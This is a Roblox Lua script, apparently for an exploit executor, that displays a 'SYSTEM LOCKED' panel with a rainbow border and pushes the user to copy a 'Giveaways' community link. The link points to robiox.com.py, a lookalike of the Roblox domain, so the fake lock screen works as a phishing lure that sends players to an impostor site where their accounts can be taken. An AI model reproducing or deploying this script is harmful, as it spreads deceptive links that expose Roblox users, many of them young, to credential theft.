local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Instruction = Instance.new("TextLabel")
local CopyButton = Instance.new("TextButton")
local ButtonCorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")

-- إعدادات الواجهة الأساسية
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.Name = "RGBAuthSystem"

MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
MainFrame.Size = UDim2.new(0, 300, 0, 200)
MainFrame.BorderSizePixel = 0

UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = MainFrame

-- إطار RGB المضيء
UIStroke.Parent = MainFrame
UIStroke.Thickness = 3
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- العنوان
Title.Parent = MainFrame
Title.Position = UDim2.new(0, 0, 0, 15)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "SYSTEM LOCKED"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 26
Title.BackgroundTransparency = 1

-- التعليمات
Instruction.Parent = MainFrame
Instruction.Position = UDim2.new(0, 15, 0, 65)
Instruction.Size = UDim2.new(1, -30, 0, 70)
Instruction.Text = "• Press COPY for Group Link\n• Join our Community to Access\n• Restart the script after joining"
Instruction.TextColor3 = Color3.fromRGB(200, 200, 200)
Instruction.Font = Enum.Font.GothamMedium
Instruction.TextSize = 15
Instruction.BackgroundTransparency = 1

-- زر النسخ
CopyButton.Parent = MainFrame
CopyButton.Position = UDim2.new(0.1, 0, 0.75, 0)
CopyButton.Size = UDim2.new(0.8, 0, 0, 35)
CopyButton.Text = "COPY LINK"
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Font = Enum.Font.GothamBold
CopyButton.TextSize = 16
CopyButton.BorderSizePixel = 0

ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = CopyButton

-- وظيفة تغيير الألوان RGB
task.spawn(function()
    local hue = 0
    while task.wait() do
        hue = hue + 1/200 -- سرعة تغيير الألوان (كلما قل الرقم كانت أبطأ وأنعيم)
        if hue > 1 then hue = 0 end
        
        local color = Color3.fromHSV(hue, 1, 1)
        UIStroke.Color = color
        CopyButton.BackgroundColor3 = color
        Title.TextColor3 = color
    end
end)

-- رابط القروب ووظيفة النسخ
local groupLink = "https://www.robiox.com.py/communities/469346776487/Giveaways"

CopyButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(groupLink)
        local oldText = CopyButton.Text
        CopyButton.Text = "COPIED!"
        task.wait(1.5)
        CopyButton.Text = oldText
    else
        local tb = Instance.new("TextBox", MainFrame)
        tb.Text = groupLink
        tb:CaptureFocus()
        tb.SelectionStart = 1
        tb.CursorPosition = #tb.Text + 1
    end
end)
